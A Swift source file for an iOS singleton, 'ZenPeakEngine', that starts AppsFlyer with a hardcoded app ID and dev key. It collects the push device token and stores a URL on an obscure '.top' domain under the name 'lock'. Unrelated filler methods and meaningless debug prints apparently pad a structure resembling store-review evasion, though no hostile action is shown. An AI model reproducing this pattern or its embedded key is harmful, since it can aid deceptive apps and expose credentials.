
import Foundation
import UIKit
import AppsFlyerLib
import Alamofire
import SwiftUI
import Combine
import WebKit

public class ZenPeakEngine: NSObject {
    
    @AppStorage("initialStart") var initialStart: String?
    @AppStorage("statusFlag")   var statusFlag: Bool = false
    @AppStorage("finalData")    var finalData: String?
    
     var hasSessionStarted = false
     var deviceToken: String = ""
     var session: Session
     var cancellables = Set<AnyCancellable>()
    
     var appsDataString: String = ""
     var appsIDString:   String = ""
     var langString:     String = ""
     var tokenString:    String = ""
    
     var lock: String = ""
     var paramName: String = ""
     var mainWindow: UIWindow?
    
    public static let shared = ZenPeakEngine()
    
    public func zenCheckNumeric(_ text: String) -> Bool {
        let isAllDigits = text.allSatisfy { $0.isNumber }
        print("zenCheckNumeric -> \(text): \(isAllDigits)")
        return isAllDigits
    }
    
    private override init() {
        let cfg = URLSessionConfiguration.default
        cfg.timeoutIntervalForRequest  = 20
        cfg.timeoutIntervalForResource = 20
        self.session = Alamofire.Session(configuration: cfg)
        super.init()
    }
    
    public func zenSummarizeFlags() {
        print("""
        zenSummarizeFlags ->
          deviceToken: \(deviceToken.isEmpty ? "nil" : deviceToken),
          lock:,
          paramName: 
        """)
    }
    
    public func ZenEngineInit(
        application: UIApplication,
        window: UIWindow,
        completion: @escaping (Result<String, Error>) -> Void
    ) {
        self.appsDataString = "dellData"
        self.appsIDString   = "dellId"
        self.langString     = "dellLng"
        self.tokenString    = "dellTk"
        self.lock           = "https://tyysuwb.top/error"
        self.paramName      = "jack"
        self.mainWindow     = window
        
        print("345fgdg")
        
        requestZenNotifications(app: application)

        print("dsafgg432")
        
        StartAF(appID: "6742100843", devKey: "froUzCHho7xfy24nCL3LSC")

        completion(.success("Initialization completed successfully"))
    }
    
    public func zenMergeUnique<T: Equatable>(_ first: [T], _ second: [T]) -> [T] {
        var result = first
        for item in second {
            if !result.contains(item) {
                result.append(item)
            }
        }
        print("zenMergeUnique -> \(result)")
        return result
    }

    
    public func ZenNotifyService(deviceToken: Data) {
        let tokenString = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
        self.deviceToken = tokenString
    }
    
    public func zenParseTinyJSON() {
        let snippet = "{\"hello\": \"world\"}"
        if let data = snippet.data(using: .utf8) {
            do {
                let parsed = try JSONSerialization.jsonObject(with: data, options: [])
                print("zenParseTinyJSON -> parsed: \(parsed)")
            } catch {
                print("zenParseTinyJSON -> error: \(error)")
            }
        }
    }
    
}
